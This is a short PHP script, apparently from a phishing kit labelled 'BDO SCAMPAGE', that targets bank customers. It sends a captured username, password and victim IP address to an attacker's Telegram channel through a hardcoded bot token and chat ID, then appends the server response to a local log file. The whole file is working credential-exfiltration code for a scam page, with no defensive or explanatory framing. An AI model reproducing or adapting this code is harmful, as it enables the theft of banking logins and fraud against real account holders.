<?php


$f1 = file_get_contents("https://api.telegram.org/bot6058365748:AAELIRCm9Y5_eiP9PYAyKT9NJCLCSUQFmNU/sendMessage?chat_id=-1001702730889&text=%5BBDO+SCAMPAGE%5D+%0A%0A+%5B%2B%5D+TrueLog%3A+No%0A%5B%2B%5D+USERNAME%3A+test%0A%5B%2B%5D+Password%3A+test%0A%5B%2B%5D+IP%3A+136.158.48.6");


$url= 'https://example.com';

$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $f1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
        curl_setopt($ch, CURLOPT_ENCODING, 'GZIP, DEFLATE, BR');
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');  
    curl_setopt($ch, CURLOPT_HEADER, 1);
  $sc = curl_exec($ch);
    curl_close($ch);


    $fp = fopen("tllo11gs.txt", "a");
fputs($fp, " $sc \n\n");
